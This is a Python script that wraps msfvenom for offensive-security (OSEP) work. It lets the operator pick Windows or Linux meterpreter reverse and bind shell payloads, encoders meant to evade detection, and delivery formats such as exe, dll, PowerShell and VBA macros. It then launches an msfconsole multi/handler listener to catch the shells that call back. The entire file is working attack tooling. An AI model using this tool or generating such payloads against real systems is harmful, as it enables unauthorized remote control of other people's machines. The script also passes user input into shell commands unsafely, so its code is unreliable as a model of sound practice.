#!/usr/bin/env python3
"""
msfvenom wrapper - OSEP focused (with clear PowerShell format)
- Windows x64 + Linux x64 meterpreter payloads only
- Formats: none + exe/dll + powershell (psh) + vba/raw/etc.
- EXITFUNC choice
- Auto LHOST tun0 + LPORT 1234
- Clipboard + listener
"""

import subprocess
import os
import netifaces as ni

def run_cmd(cmd):
    return subprocess.run(cmd, shell=True, text=True, capture_output=True, check=True).stdout.strip()

def get_tun0_ip():
    interfaces = ['tun0', 'eth0', 'wlan0', 'enp0s3', 'ens33']
    for iface in interfaces:
        try:
            addrs = ni.ifaddresses(iface)
            if ni.AF_INET in addrs:
                return addrs[ni.AF_INET][0]['addr']
        except:
            pass
    return "127.0.0.1"

def select_item(title, items):
    print(f"\n{title}")
    print("-" * len(title))
    for i, item in enumerate(items, 1):
        print(f"{i:3d}) {item}")
    while True:
        try:
            idx = int(input("→ ")) - 1
            if 0 <= idx < len(items):
                return items[idx]
        except:
            pass
        print("Invalid choice.")

def main():
    LHOST = get_tun0_ip()
    LPORT = "1234"

    print(f"LHOST: {LHOST}   LPORT: {LPORT}\n")

    # Focused meterpreter payloads
    meterpreter_payloads = [
        # Windows x64 meterpreter
        "windows/x64/meterpreter/reverse_tcp",
        "windows/x64/meterpreter_reverse_tcp",
        "windows/x64/meterpreter/bind_tcp",
        "windows/x64/meterpreter_reverse_http",
        "windows/x64/meterpreter_reverse_https",
        "windows/x64/meterpreter/bind_named_pipe",
        "windows/x64/meterpreter/reverse_named_pipe",
        # Linux x64 meterpreter
        "linux/x64/meterpreter/reverse_tcp",
        "linux/x64/meterpreter/bind_tcp",
        "linux/x64/meterpreter_reverse_http",
        "linux/x64/meterpreter_reverse_https",
    ]

    payload = select_item("Meterpreter Payloads", meterpreter_payloads)

    # Encoders (basic useful set)
    encoders = [
        "none",
        "x64/zutto_dekiru",
        "x64/shikata_ga_nai",
        "x64/call4_dword_xor",
        "x86/shikata_ga_nai",
    ]
    encoder = select_item("Encoder", encoders)

    # Formats - now with "powershell" clearly listed (maps to psh)
    formats = [
        "none",
        "exe", "exe-service", "exe-small",
        "dll", "dllinject", "dllordinject",
        "powershell", "psh", "psh-net", "psh-reflection", "psh-cmd",  # PowerShell options
        "vba", "vba-psh", "vba-exe",
        "raw", "c", "csharp",
    ]
    fmt = select_item("Format", formats)

    # Map "powershell" back to "psh" (msfvenom uses psh internally)
    if fmt == "powershell":
        fmt = "psh"

    # EXITFUNC
    exitfuncs = ["thread", "process", "seh"]
    exitfunc = select_item("EXITFUNC (thread = most reliable)", exitfuncs)

    # Output file?
    outfile = None
    if input("\nSave to file? (y/n): ").lower().startswith("y"):
        outfile = input("Filename (e.g. shell.exe / shell.ps1): ").strip() or "payload.bin"

    # Build command
    cmd = f"msfvenom -p {payload} LHOST={LHOST} LPORT={LPORT} EXITFUNC={exitfunc}"
    if encoder != "none":
        cmd += f" -e {encoder}"
    cmd += f" -f {fmt}"
    if outfile:
        cmd += f" -o {outfile}"

    print("\nGenerating payload...")
    subprocess.run(cmd, shell=True, check=True)

    if outfile and os.path.exists(outfile):
        print(f"[+] Saved: {outfile}")

    # Copy command to clipboard
    subprocess.run(f"echo -n '{cmd}' | xclip -selection clipboard", shell=True)
    print("[+] Command copied to clipboard")

    # Listener
    if input("\nStart listener in msfconsole? (y/n): ").lower().startswith("y"):
        listener = (
            f"use multi/handler;"
            f"set payload {payload};"
            f"set LHOST {LHOST};"
            f"set LPORT {LPORT};"
            f"set ExitOnSession false;"
            f"run -j"
        )
        print("Launching msfconsole...")
        subprocess.run(f'msfconsole -q -x "{listener}"', shell=True)

if __name__ == "__main__":
    main()
